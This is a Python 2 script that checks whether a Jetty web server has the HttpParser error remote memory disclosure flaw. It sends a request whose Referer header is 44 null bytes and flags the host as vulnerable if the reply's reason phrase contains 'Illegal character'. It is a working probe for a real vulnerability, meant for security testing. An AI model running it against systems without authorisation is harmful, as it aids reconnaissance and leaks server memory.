#!/usr/bin/python
###########################################################################################################################
# Test script to check Jetty HttpParser Error Remote Memory Disclosure
# Version 1.10 Build 20150611
# Created by Ashwani Talreja
# Email: indian.hackerz.ash@gmail.com
# Please report if any errors on above email id for improvements within the script
# Kindly refer to Changelog for implemented changes in each version
# https://github.com/ashwani-talreja/Python-Scripts/tree/master/Jetty-HttpParser-Error-Remote-Memory-Disclosure
###########################################################################################################################

import errno
from socket import error as socket_error
import httplib, urllib, sys, re

def validIP(address):
    parts = address.split(".")
    if len(parts) != 4:
        return False
    for item in parts:
        if not 0 <= int(item) <= 255:
            return False
    return True

def is_valid_hostname(hostname):
    if len(hostname) > 255:
		return False
    if hostname[-1] == ".":
        hostname = hostname[:-1] # strip exactly one dot from the right, if present
    allowed = re.compile("(?!-)[A-Z\d-]{1,63}(?<!-)$", re.IGNORECASE)
    return all(allowed.match(x) for x in hostname.split("."))	

print "Script created by Ashwani Talreja - Version 1.10 Build 20150611"
print "Jetty HttpParser Error Remote Memory Disclosure Check"
print

if len(sys.argv) < 4 :
	print "Usage: Jetty_RMD.py Hostname Port SSL(Y/N)"
	print "Example: Jetty_RMD.py 10.10.10.10 80 N"
	print "Example: Jetty_RMD.py google.com 443 Y"
	sys.exit(1)
elif sys.argv[1].find("http://") != -1 or sys.argv[1].find("https://") != -1:
	print "Usage: Jetty_RMD.py Hostname Port SSL(Y/N)"
	print "Example: Jetty_RMD.py 10.10.10.10 8888 N"
	print "Example: Jetty_RMD.py google.com 8443 Y"
	sys.exit(1)
elif is_valid_hostname(sys.argv[1]) == False and validIP(sys.argv[1]) == False :
	print "Usage: Jetty_RMD.py Hostname Port SSL(Y/N)"
	print "Example: Jetty_RMD.py 10.10.10.10 8008 N"
	print "Example: Jetty_RMD.py google.com 2381 Y"
	sys.exit(1)
elif sys.argv[2].isdigit() == False :
	print "Usage: Jetty_RMD.py Hostname Port SSL(Y/N)"
	print "Example: Jetty_RMD.py 10.10.10.10 8080 N"
	print "Example: Jetty_RMD.py google.com 8443 Y"
	sys.exit(1)
elif sys.argv[3].upper() != "Y" and sys.argv[3].upper() != "N":
	print "Usage: Jetty_RMD.py Hostname Port SSL(Y/N)"
	print "Example: Jetty_RMD.py 10.10.10.10 8080 N"
	print "Example: Jetty_RMD.py google.com 8443 Y"
	sys.exit(1)

try:
	if sys.argv[3].upper() == "Y":
		conn = httplib.HTTPSConnection(str(sys.argv[1]) + ":" + str(sys.argv[2]))
	else:
		conn = httplib.HTTPConnection(str(sys.argv[1]) + ":" + str(sys.argv[2]))
	headers = {"Referer": chr(0)*44}
	conn.request("GET", "/", "", headers)
	res = conn.getresponse()
	if res.reason.find("Illegal character") != -1 :
		print "Host " + str(sys.argv[1]) + ":" + str(sys.argv[2]) + " is Vulnerable !!!"
		print
		print "The code produced the following truncated output:"
		if res.version == 10:
			print "HTTP/1.0", res.status, res.reason
		elif res.version == 11:
			print "HTTP/1.1", res.status, res.reason
	else:
		print "Host " + str(sys.argv[1]) + ":" + str(sys.argv[2]) + " is not vulnerable."
		print
		print "The code produced the following truncated output:"
		if res.version == 10:
			print "HTTP/1.0", res.status, res.reason
		elif res.version == 11:
			print "HTTP/1.1", res.status, res.reason
except httplib.BadStatusLine:
	print "Host " + str(sys.argv[1]) + ":" + str(sys.argv[2]) + " sent bad status code, please recheck parameter details."
except socket_error as err:
	print "Unable to connect to " + str(sys.argv[1]) + ":" + str(sys.argv[2]) + "\n\nFollowing error was received:\n" + str(err)
except BaseException as err:
	print "Host " + str(sys.argv[1]) + ":" + str(sys.argv[2]) + " threw some malformed error." + "\n\nFollowing error was received:\n" + str(err)
